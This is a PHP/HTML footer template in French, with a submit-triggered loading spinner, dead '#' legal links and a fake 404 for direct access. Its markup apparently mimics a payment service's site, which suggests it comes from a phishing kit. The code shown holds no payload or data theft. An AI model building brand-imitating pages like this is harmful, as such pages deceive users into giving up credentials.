<?php
if (!isset($config)) {
  header("HTTP/1.0 404 Not Found");
  exit;
}
require_once(b. '/views/components/base.php');
?>
<script>
  document.addEventListener("DOMContentLoaded", function() {
    document.querySelector("button[type=submit]").addEventListener("click", function(e) {
      document.getElementById("loader-div-new").classList.remove("hidden-class-new");
       document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;"
    })
  });
</script>
<div class="intentFooter ">
  <div class="localeSelector">
  </div>
</div>
<div id="loader-div-new" class="hidden-class-new">
  <div id="mask-id-new"></div>
  <div class="spinner-class-new loading-class-new"></div>
</div>
<div id="loader-div-new2" class="hidden-class-new">
  <br/>
  <div class="spinner-class-new loading-class-new"></div>
  <center>
    <p>Veuillez ne pas quitter cette page.</p>
  </center>
</div>
</div>
<footer class="footer" role="contentinfo">
  <div class="legalFooter">
    <ul class="footerGroup">
      <li><a target="_blank" href="#" pa-marked="1">Contact</a></li>
      <li><a target="_blank" href="#" pa-marked="1">Respect de la vie privée</a>
      </li>
      <li><a target="_blank" href="#" pa-marked="1">Contrats d'utilisation</a></li>
      <li><a target="_blank" href="#" pa-marked="1">International</a></li>
    </ul>
  </div>
</footer>
</div>

</body>

</html>